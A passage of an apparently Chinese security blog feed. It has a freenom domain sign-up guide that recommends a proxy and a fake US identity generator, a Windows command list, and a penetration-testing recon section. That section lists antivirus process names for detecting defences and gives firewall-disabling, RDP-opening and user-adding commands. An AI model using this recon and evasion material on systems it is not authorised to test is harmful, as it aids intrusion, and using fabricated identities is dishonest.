src="/2021/12/26/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/e7ba2a1434fb4ab19d1904a3a4c03162.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frp </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>freenom免费域名申请</title>
      <link href="/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/"/>
      <url>/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="freenom免费域名申请"><a href="#freenom免费域名申请" class="headerlink" title="freenom免费域名申请"></a>freenom免费域名申请</h1><h2 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h2><p>我们熟知的免费域名，有.tk，.ml，.cf等。.tk域名是南太平洋岛国托克劳的顶级域名，.ml则是马里的顶级域名，.cf则是中非共和国的域名，不过搜索引擎基本上已经不收录了，虽然这些域名和.cn其实没什么区别。以前这些免费域名都是分开注册的，后来都被托管到了freenom，更加方便大家的注册。</p><p>自己最好拥有美国ip地址代理，因为freenom屏蔽了中国ip。</p><p><strong>有google账户直接申请</strong></p><h3 id="注册账户"><a href="#注册账户" class="headerlink" title="注册账户"></a>注册账户</h3><ol><li>打开注册页面：<a href="https://www.freenom.com/en/index.html">https://www.freenom.com/en/index.html</a></li></ol><p><img src="/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/eed3e99a5336403eaf3962fe24b20967.png"></p><p><img src="/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/0690f36c9d1d4e6ebf7601af0f71c8c2.png"></p><p>下拉点击</p><p><img src="/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7%5Cc19fb61f15fd4635ba3af2be82c52654.png"></p><p><img src="/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/28c958c4c77f4333bd6bfbfcbf801757.png"></p><ol start="2"><li><p>或者自己找个临时邮箱网站注册<br>点击发来的验证连接验证即可</p></li><li><p>找个虚拟美国身份生成网站<br><a href="https://shenfendaquan.com/">https://shenfendaquan.com/</a></p></li></ol><p><img src="/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/cb8cdc9f59ae4d2b882b62310197cc6f.png"></p><p>对应填入其中<br><img src="/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/23b4485b428641c0bc5f351c9dc42abe.png"></p><p>最后跳出一个成功单号说明页面表明注册成功</p><h3 id="注册免费域名"><a href="#注册免费域名" class="headerlink" title="注册免费域名"></a>注册免费域名</h3><p>登入账户后注册域名<br><img src="/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/78c172d397674aa7aa12a6745bc51297.png"></p><p>选择自己想注册域名<br><img src="/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/9cc106f3d7a74c8eb9d8503c0c876adb.png"></p><p><img src="/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/5b769d0c7d00452e87dcdf1d177e92b0.png"></p><p><img src="/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/e1ea4db479b44a1a8afa07d4f96b8fcf.png"></p><p>出现下面生成订单号表明成功</p><p><img src="/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/f166b2cc5b0f4f949f818b56af0dc833.png"></p><p>即可到services中my domains查看域名</p><p><img src="/2021/12/25/freenom%E5%85%8D%E8%B4%B9%E5%9F%9F%E5%90%8D%E7%94%B3%E8%AF%B7/911e41cb898c47cc9fbf39c82734037c.png"></p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> domain </tag>
            
            <tag> freenom </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows常用命令</title>
      <link href="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="windows基础命令"><a href="#windows基础命令" class="headerlink" title="windows基础命令"></a>windows基础命令</h1><h2 id="windowsc常用基础命令"><a href="#windowsc常用基础命令" class="headerlink" title="windowsc常用基础命令"></a>windowsc常用基础命令</h2><ol><li>注册表:<code>regedit</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/fef8d03ed661499b9f210a26d432ff82.png"></p><ol start="2"><li>日志查看器:<code>eventvwr</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/754d4ad683a54e3b8906197109a0f45a.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/355edd9f51fc4da29790923784e9e57f.png"></p><ol start="3"><li>组策略编辑器：<code>gpedit.msc</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/f7d30e5902294720b54e645594d934ce.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/dee64602508944a28e33ba7de6ce8448.png"></p><ol start="4"><li>服务查看器：<code>services.msc</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/b806448f549e4a5983e61bdea4825062.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/db8c784f21404c83ae013ee6ec769717.png"></p><ol start="5"><li>远程桌面：<code>mstsc</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/70f660a9a0754297bb4b79121c23df74.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/258104c696d6422590f5b45a0b45dd59.png"></p><ol start="6"><li>查看SID：<code>whoami /user</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/354b1ca4456e4242b8288a5c97883086.png"></p><ol start="7"><li>查看当前设备上的所有用户：<code>net user</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/4df0909ea7d14a109c13f80bf0ac6ac8.png"></p><ol start="8"><li>查看设备上的指定用户：<code>net user 用户名</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/19e26f0e53824d0084a9bd98d41ebdcf.png"></p><ol start="9"><li>查看在线用户：<code>query user</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/acf5c54093e343cd991b65779d9d4fd4.png"></p><ol start="10"><li>注销在线用户：<code>logoff ID号</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/7f85d1559f174fc0bfa05f39f515bac1.png"></p><ol start="11"><li>查看权限：<code>whoami</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/2ca06d076e7f48ad9a6400940153ecfb.png"><br>ps:格式为主机名+用户名</p><ol start="12"><li>查询主机名：<code>hostname</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/2c12bd99577d436eb1f01140a77d1a12.png"></p><ol start="13"><li>查询详细权限：<code>whoami /priv</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/b5a08e6aaf86457ba069b49b4b1a498e.png"></p><ol start="14"><li>添加用户：<code>net user 用户名 密码 /add</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/ce418683de9b4fcca30bb4eac95cb675.png"></p><ol start="15"><li>删除用户：<code>net user 用户名 /del</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/231947d31b7d4c32af059c56e796c580.png"></p><ol start="16"><li>查询组：<code>net localgroup</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/e6620ddecc834645893005e6a8d63076.png"></p><ol start="17"><li>查询组内成员：<code>net localgroup 组名</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/6abc8ad81ee244188120ce52590eea84.png"></p><ol start="18"><li>将指定用户添加到指定组内：<code>net localgroup 组名 用户名 /add</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/ba8656ecf4b24ea080b3e1b1d6be4d03.png"></p><ol start="19"><li>查询系统信息：<code>systeminfo</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/7151010d7eef4a34ae40f5509a71617e.png"></p><ol start="20"><li>查询系统架构：<code>echo %PROCESSOR_ARCHITECTURE%</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/71775d48d280443fb6f2f0919a5db44b.png"></p><ol start="21"><li>使用powershell查询系统安装软件与版本信息：<code>Get-WmiObject -Class win32_product | Select-Object -Property name,version</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/05e1896092034e10ac2b8b2016bdcda3.png"></p><ol start="22"><li>使用wmic查询系统安装软件与版本信息（在win10以下版本使用）：<code>wmic product get name,version</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/41618587f4ac4df5ab451d76b1497c25.png"></p><ol start="23"><li><p>使用wmic查询系统服务与服务进程ID、服务状态：<code>wmic service list brief</code><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/b2aa42c1229b4d3faa408b2b93e9202b.png"></p></li><li><p>查询进程：<code>tasklist</code></p></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/ea7a4e8869c84fcca83f181b21e5021c.png"></p><ol start="25"><li>使用wmic查询进程：<code>wmic process list brief</code></li></ol><ol start="26"><li>筛选命令和linux的grep相近：&lt;code&gt;findstr&lt;/code&gt;”&gt;26.筛选命令和linux的grep相近：<code>findstr</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/7719854174f14107a05e0a1c8773488e.png"></p><ol start="27"><li>结束进程命令：<code>taskkill /f /pid PID号</code> <code>taskkill /f /im 进程名</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/762cbfeecffa43d98dcdbe10f12009f8.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/93b08eb97b3a4a289d55e029196badd7.png"></p><ol start="28"><li>显示每个进程中的服务信息：<code>tasklist /svc</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/fcd8d24d185941fba5882f64cad5824e.png"></p><ol start="29"><li>使用wmic查看windows系统中补丁详细信息：<code>wmic qfe get caption,description,hotfixid,installedon</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/9497f2538add41f980784312f831a140.png"></p><ol start="30"><li>使用wmic显示windows系统中补丁号：<code>wmic qfe get hotfixid</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/019d07df87ec4e9b9c9b223cb1563290.png"></p><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/b21e0c7cd84d46dfb19933de7d7d18da.png"></p><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/ae1a9090c76543f8a3f229d373e318ab.png"></p><ol start="33"><li>查询arp表：<code>arp -a</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/c7fa0de2307b48a79c29b01f309b9584.png"></p><ol start="34"><li>查看防火墙配置信息：<code>netsh firewall show config</code></li></ol><ol start="35"><li>查询端口信息：<code>netstat -ano</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/35b5d2d965714abd965fc26185ef02f2.png"></p><ol start="36"><li>查询代理信息：<code>reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings"</code></li></ol><ol start="37"><li><p>查询远程连接端口：<code>reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber</code></p></li><li><p>清除DNS缓存：<code>ipconfig /flushdns</code></p></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/07557a61bc2d4b12b97c696c8e55f49e.png"></p><ol start="39"><li>查询DNS缓存：<code>ipconfig /displaydns</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/091736b3d3134506be02c3209d1dedc0.png"></p><ol start="40"><li>查询MAC地址：<code>getmac</code> <code>ipconfig /all</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/9510fc5066424b20ac8f24ba9a995bd3.png"><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/d5d4704ef65d4ccf84b353e788c07b01.png"></p><ol start="41"><li>查看文本内容：<code>type *.txt</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/518032d010554155950d1b3f39680c66.png"></p><ol start="42"><li>查看凭据管理器：<code>cmdkey /list</code></li></ol><p><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/6ae020507260413c838fc70d639a102c.png"></p><ol start="43"><li>环境变量遍历：<code>set</code><br><img src="/2021/12/23/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/4818e7274d084df7be3712d6d40ac7de.png"></li></ol><h2 id="windows-信息收集"><a href="#windows-信息收集" class="headerlink" title="windows 信息收集"></a>windows 信息收集</h2><h3 id="本机信息"><a href="#本机信息" class="headerlink" title="本机信息"></a>本机信息</h3><h4 id="1、系统程序"><a href="#1、系统程序" class="headerlink" title="1、系统程序"></a>1、系统程序</h4><p>收集系统信息，包括操作系统版本，已安装</p><figure class="highlight applescript"><table><tbody><tr><td class="code"><pre><span class="line">补丁列表等。通常使⽤已下⽅法收集：</span><br><span class="line">net config workstation/server          <span class="comment"># 查 询简易系统信息</span></span><br><span class="line">systeminfo           <span class="comment"># 查询系统详细信息，注意版本、位数、域、补丁信息、更新频率</span></span><br><span class="line">wmic qfe <span class="keyword">get</span> Caption,Description,HotFixID,InstalledOn        <span class="comment"># 使用wmic查看安装在系统中的补丁:名称，描述，ID，安装时间</span></span><br></pre></td></tr></tbody></table></figure><p>注：其中 systeminfo 命令查询内容最全，但如果系统更新的补丁较多，可能会导致反应反应时间过⻓； 使⽤ webshell 执⾏此命令可能会因为超时导致⽆法正常回显，或回显内容⻓度过⻓，⽆法全部显示。在渗透测试systeminfo使用频率较高。</p><h4 id="2、进程服务"><a href="#2、进程服务" class="headerlink" title="2、进程服务"></a>2、进程服务</h4><figure class="highlight applescript"><table><tbody><tr><td class="code"><pre><span class="line">tasklist /v          <span class="comment"># 查询正在运⾏的进程</span></span><br><span class="line">wmic product <span class="keyword">get</span> <span class="built_in">name</span>,<span class="built_in">version</span>            <span class="comment"># 查询所有安装过的软件及版本</span></span><br><span class="line">powershell <span class="string">"Get-WmiObject -class Win32_Product |Select-Object -Pro perty name,version"</span> </span><br><span class="line"><span class="comment"># 使⽤ powershell 查询所有安装过的软件及版本，效果和 wmic 相同 </span></span><br><span class="line">wmic service <span class="built_in">list</span> brief         <span class="comment"># 查询当前机器的服务信息</span></span><br></pre></td></tr></tbody></table></figure><p><strong>常⻅杀软进程名：</strong></p><figure class="highlight stylus"><table><tbody><tr><td class="code"><pre><span class="line">{<span class="string">"360tray.exe"</span>,    <span class="string">"360安全卫士"</span>},</span><br><span class="line">{<span class="string">"360sd.exe"</span>,      <span class="string">"360杀毒"</span>},</span><br><span class="line">{<span class="string">"a2guard.exe"</span>,    <span class="string">"a-squared杀毒"</span>},</span><br><span class="line">{<span class="string">"ad-watch.exe"</span>,    <span class="string">"Lavasoft杀毒"</span>},</span><br><span class="line">{<span class="string">"cleaner8.exe"</span>,    <span class="string">"The Cleaner杀毒"</span>},</span><br><span class="line">{<span class="string">"vba32lder.exe"</span>,    <span class="string">"vb32杀毒"</span>},</span><br><span class="line">{<span class="string">"MongoosaGUI.exe"</span>,    <span class="string">"Mongoosa杀毒"</span>},</span><br><span class="line">{<span class="string">"CorantiControlCenter32.exe"</span>,    <span class="string">"Coranti2012杀毒"</span>},</span><br><span class="line">{<span class="string">"F-PROT.EXE"</span>,    <span class="string">"F-PROT杀毒"</span>},</span><br><span class="line">{<span class="string">"CMCTrayIcon.exe"</span>,    <span class="string">"CMC杀毒"</span>},</span><br><span class="line">{<span class="string">"K7TSecurity.exe"</span>,    <span class="string">"K7杀毒"</span>},</span><br><span class="line">{<span class="string">"UnThreat.exe"</span>,    <span class="string">"UnThreat杀毒"</span>},</span><br><span class="line">{<span class="string">"CKSoftShiedAntivirus4.exe"</span>,    <span class="string">"Shield Antivirus杀毒"</span>},</span><br><span class="line">{<span class="string">"AVWatchService.exe"</span>,    <span class="string">"VIRUSfighter杀毒"</span>},</span><br><span class="line">{<span class="string">"ArcaTasksService.exe"</span>,    <span class="string">"ArcaVir杀毒"</span>},</span><br><span class="line">{<span class="string">"iptray.exe"</span>,    <span class="string">"Immunet杀毒"</span>},</span><br><span class="line">{<span class="string">"PSafeSysTray.exe"</span>,    <span class="string">"PSafe杀毒"</span>},</span><br><span class="line">{<span class="string">"nspupsvc.exe"</span>,    <span class="string">"nProtect杀毒"</span>},</span><br><span class="line">{<span class="string">"SpywareTerminatorShield.exe"</span>,    <span class="string">"SpywareTerminator杀毒"</span>},</span><br><span class="line">{<span class="string">"BKavService.exe"</span>,    <span class="string">"Bkav杀毒"</span>},</span><br><span class="line">{<span class="string">"MsMpEng.exe"</span>,    <span class="string">"Microsoft Security Essentials"</span>},</span><br><span class="line">{<span class="string">"SBAMSvc.exe"</span>,    <span class="string">"VIPRE"</span>},</span><br><span class="line">{<span class="string">"ccSvcHst.exe"</span>,    <span class="string">"Norton杀毒"</span>},</span><br><span class="line">{<span class="string">"QQ.exe"</span>,    <span class="string">"QQ"</span>},</span><br><span class="line">{<span class="string">"f-secure.exe"</span>,    <span class="string">"冰岛"</span>},</span><br><span class="line">{<span class="string">"avp.exe"</span>,        <span class="string">"卡巴斯基"</span>},</span><br><span class="line">{<span class="string">"KvMonXP.exe"</span>,    <span class="string">"江民杀毒"</span>},</span><br><span class="line">{<span class="string">"RavMonD.exe"</span>,    <span class="string">"瑞星杀毒"</span>},</span><br><span class="line">{<span class="string">"Mcshield.exe"</span>,   <span class="string">"麦咖啡"</span>},</span><br><span class="line">{<span class="string">"egui.exe"</span>,       <span class="string">"NOD32"</span>},</span><br><span class="line">{<span class="string">"kxetray.exe"</span>,    <span class="string">"金山毒霸"</span>}, </span><br><span class="line">{<span class="string">"knsdtray.exe"</span>,   <span class="string">"可牛杀毒"</span>},</span><br><span class="line">{<span class="string">"TMBMSRV.exe"</span>,    <span class="string">"趋势杀毒"</span>},</span><br><span class="line">{<span class="string">"avcenter.exe"</span>,   <span class="string">"Avira(小红伞)"</span>},</span><br><span class="line">{<span class="string">"ashDisp.exe"</span>,    <span class="string">"Avast网络安全"</span>}, </span><br><span class="line">{<span class="string">"rtvscan.exe"</span>,    <span class="string">"诺顿杀毒"</span>}, </span><br><span class="line">{<span class="string">"ksafe.exe"</span>,      <span class="string">"金山卫士"</span>}, </span><br><span class="line">{<span class="string">"QQPCRTP.exe"</span>,    <span class="string">"QQ电脑管家"</span>},</span><br><span class="line">{<span class="string">"Miner.exe"</span>,    <span class="string">"流量矿石"</span>},</span><br><span class="line">{<span class="string">"AYAgent.aye"</span>,    <span class="string">"韩国胶囊"</span>},</span><br><span class="line">{<span class="string">"patray.exe"</span>,    <span class="string">"安博士"</span>},</span><br><span class="line">{<span class="string">"V3Svc.exe"</span>,    <span class="string">"安博士V3"</span>},</span><br><span class="line">{<span class="string">"avgwdsvc.exe"</span>,    <span class="string">"AVG杀毒"</span>},</span><br><span class="line">{<span class="string">"ccSetMgr.exe"</span>,    <span class="string">"赛门铁克"</span>},</span><br><span class="line">{<span class="string">"QUHLPSVC.EXE"</span>,    <span class="string">"QUICK HEAL杀毒"</span>},</span><br><span class="line">{<span class="string">"mssecess.exe"</span>,    <span class="string">"微软杀毒"</span>},</span><br><span class="line">{<span class="string">"SavProgress.exe"</span>,    <span class="string">"Sophos杀毒"</span>},</span><br><span class="line">{<span class="string">"fsavgui.exe"</span>,    <span class="string">"F-Secure杀毒"</span>},</span><br><span class="line">{<span class="string">"vsserv.exe"</span>,    <span class="string">"比特梵德"</span>},</span><br><span class="line">{<span class="string">"remupd.exe"</span>,    <span class="string">"熊猫卫士"</span>},</span><br><span class="line">{<span class="string">"FortiTray.exe"</span>,    <span class="string">"飞塔"</span>},</span><br><span class="line">{<span class="string">"safedog.exe"</span>,    <span class="string">"安全狗"</span>},</span><br><span class="line">{<span class="string">"parmor.exe"</span>,    <span class="string">"木马克星"</span>},</span><br><span class="line">{<span class="string">"beikesan.exe"</span>,    <span class="string">"贝壳云安全"</span>},</span><br><span class="line">{<span class="string">"KSWebShield.exe"</span>,    <span class="string">"金山网盾"</span>},</span><br><span class="line">{<span class="string">"TrojanHunter.exe"</span>,    <span class="string">"木马猎手"</span>},</span><br><span class="line">{<span class="string">"GG.exe"</span>,    <span class="string">"巨盾网游安全盾"</span>},</span><br><span class="line">{<span class="string">"adam.exe"</span>,    <span class="string">"绿鹰安全精灵"</span>},</span><br><span class="line">{<span class="string">"AST.exe"</span>,    <span class="string">"超级巡警"</span>},</span><br><span class="line">{<span class="string">"ananwidget.exe"</span>,    <span class="string">"墨者安全专家"</span>},</span><br><span class="line">{<span class="string">"AVK.exe"</span>,    <span class="string">"GData"</span>},</span><br><span class="line">{<span class="string">"ccapp.exe"</span>,    <span class="string">"Symantec Norton"</span>},</span><br><span class="line">{<span class="string">"avg.exe"</span>,    <span class="string">"AVG Anti-Virus"</span>},</span><br><span class="line">{<span class="string">"spidernt.exe"</span>,    <span class="string">"Dr.web"</span>},</span><br><span class="line">{<span class="string">"Mcshield.exe"</span>,    <span class="string">"Mcafee"</span>},</span><br><span class="line">{<span class="string">"avgaurd.exe"</span>,    <span class="string">"Avira Antivir"</span>},</span><br><span class="line">{<span class="string">"F-PROT.exe"</span>,    <span class="string">"F-Prot AntiVirus"</span>},</span><br><span class="line">{<span class="string">"vsmon.exe"</span>,    <span class="string">"ZoneAlarm"</span>},</span><br><span class="line">{<span class="string">"avp.exee"</span>,    <span class="string">"Kaspersky"</span>},</span><br><span class="line">{<span class="string">"cpf.exe"</span>,    <span class="string">"Comodo"</span>},</span><br><span class="line">{<span class="string">"outpost.exe"</span>,    <span class="string">"Outpost Firewall"</span>},</span><br><span class="line">{<span class="string">"rfwmain.exe"</span>,    <span class="string">"瑞星防火墙"</span>},</span><br><span class="line">{<span class="string">"kpfwtray.exe"</span>,    <span class="string">"金山网镖"</span>},</span><br><span class="line">{<span class="string">"FYFireWall.exe"</span>,    <span class="string">"风云防火墙"</span>},</span><br><span class="line">{<span class="string">"MPMon.exe"</span>,    <span class="string">"微点主动防御"</span>},</span><br><span class="line">{<span class="string">"pfw.exe"</span>,    <span class="string">"天网防火墙"</span>},</span><br><span class="line">{<span class="string">"S.exe"</span>,    <span class="string">"在抓鸡"</span>},</span><br><span class="line">{<span class="string">"1433.exe"</span>,    <span class="string">"在扫1433"</span>},</span><br><span class="line">{<span class="string">"DUB.exe"</span>,    <span class="string">"在爆破"</span>},</span><br><span class="line">{<span class="string">"ServUDaemon.exe"</span>,    <span class="string">"发现S-U"</span>},</span><br><span class="line">{<span class="string">"BaiduSdSvc.exe"</span>,    <span class="string">"百度杀软"</span>},</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">安全狗</span><br><span class="line">SafeDogGuardCenter<span class="selector-class">.exe</span></span><br><span class="line">safedogupdatecenter<span class="selector-class">.exe</span></span><br><span class="line">safedogguardcenter<span class="selector-class">.exe</span></span><br><span class="line">SafeDogSiteIIS<span class="selector-class">.exe</span></span><br><span class="line">SafeDogTray<span class="selector-class">.exe</span></span><br><span class="line">SafeDogServerUI<span class="selector-class">.exe</span></span><br><span class="line"></span><br><span class="line">D盾</span><br><span class="line">D_Safe_Manage<span class="selector-class">.exe</span></span><br><span class="line">d_manage<span class="selector-class">.exe</span></span><br><span class="line"></span><br><span class="line">云锁</span><br><span class="line">yunsuo_agent_service<span class="selector-class">.exe</span></span><br><span class="line">yunsuo_agent_daemon<span class="selector-class">.exe</span></span><br><span class="line"></span><br><span class="line">护卫神</span><br><span class="line">HwsPanel<span class="selector-class">.exe</span>  护卫神·入侵防护系统（状态托盘）</span><br><span class="line">hws_ui<span class="selector-class">.exe</span>    护卫神·入侵防护系统 - www<span class="selector-class">.huweishen</span><span class="selector-class">.com</span></span><br><span class="line">hws<span class="selector-class">.exe</span>       护卫神·入侵防护系统 服务处理程序</span><br><span class="line">hwsd<span class="selector-class">.exe</span>      护卫神·入侵防护系统 监控组件</span><br><span class="line"></span><br><span class="line">火绒</span><br><span class="line">hipstray<span class="selector-class">.exe</span></span><br><span class="line">wsctrl<span class="selector-class">.exe</span></span><br><span class="line">usysdiag.exe</span><br></pre></td></tr></tbody></table></figure><p><code>wmic startup get command,caption # 查看启动项</code></p><p><code>schtasks /query /fo LIST /v # 查看任务计划</code></p><p>windows ⾃带防⽕墙及特殊过滤规则等⽹络访问均可使⽤ netsh 及相关命令查看。</p><figure class="highlight routeros"><table><tbody><tr><td class="code"><pre><span class="line">netsh<span class="built_in"> firewall </span>show<span class="built_in"> config </span>     # 查看防⽕墙信息，但<span class="built_in"> firewall </span>命令已弃⽤，可使⽤ advfirewall 命令代替 </span><br><span class="line">netsh advfirewall<span class="built_in"> firewall </span>show rule <span class="attribute">name</span>=all      # 查看配置规则</span><br><span class="line">netsh advfirewall <span class="builtin-name">set</span> allprofiles state off\on     # 关闭防⽕墙\开启防⽕墙 </span><br><span class="line">netsh advfirewall export\import xx.pol     # 导出\导⼊配置⽂件</span><br><span class="line">netsh advfirewall<span class="built_in"> firewall </span><span class="builtin-name">add</span> rule <span class="attribute">name</span>=”deny tcp 139″ <span class="attribute">dir</span>=in pr <span class="attribute">otocol</span>=tcp <span class="attribute">localport</span>=139 <span class="attribute">action</span>=block      # 新建规则阻⽌TCP协议139端⼝ </span><br><span class="line">netsh advfirewall<span class="built_in"> firewall </span><span class="builtin-name">add</span> rule <span class="attribute">name</span>=<span class="string">"Remote Desktop"</span> protoco <span class="attribute">l</span>=TCP <span class="attribute">dir</span>=in <span class="attribute">localport</span>=3389 <span class="attribute">action</span>=allow             # 新建规则允 许3389通过防⽕墙 </span><br><span class="line">netsh advfirewall<span class="built_in"> firewall </span>delete rule <span class="attribute">name</span>=Remote Desktop      # 删除名为Remote Desktop的规则 </span><br><span class="line">netsh<span class="built_in"> interface </span>       # 连接安全规则配置， 很少配置</span><br></pre></td></tr></tbody></table></figure><h4 id="3、用户信息"><a href="#3、用户信息" class="headerlink" title="3、用户信息"></a>3、用户信息</h4><figure class="highlight nsis"><table><tbody><tr><td class="code"><pre><span class="line">whoami    <span class="comment"># 当前⽤户 </span></span><br><span class="line">quser    <span class="comment"># 查询登录⽤户，同 query user </span></span><br><span class="line">qwinsta   <span class="comment"># 查询登录⽤户，同 query user </span></span><br><span class="line">query <span class="literal">user</span>   <span class="comment"># 查询登录⽤户 </span></span><br><span class="line">query session    <span class="comment"># 查询会话 </span></span><br><span class="line">query termserver    <span class="comment"># 查询远程桌⾯主机列表。 </span></span><br><span class="line">net accounts   <span class="comment"># 查询域密码策略 </span></span><br><span class="line">net <span class="literal">user</span>    <span class="comment"># 查询本地⽤户列表</span></span><br><span class="line">net <span class="literal">user</span> <span class="string">"<span class="variable">$username</span>"</span>    <span class="comment"># 查询指定⽤户 </span></span><br><span class="line">net localgroup   <span class="comment"># 查询本地⽤户组列表 </span></span><br><span 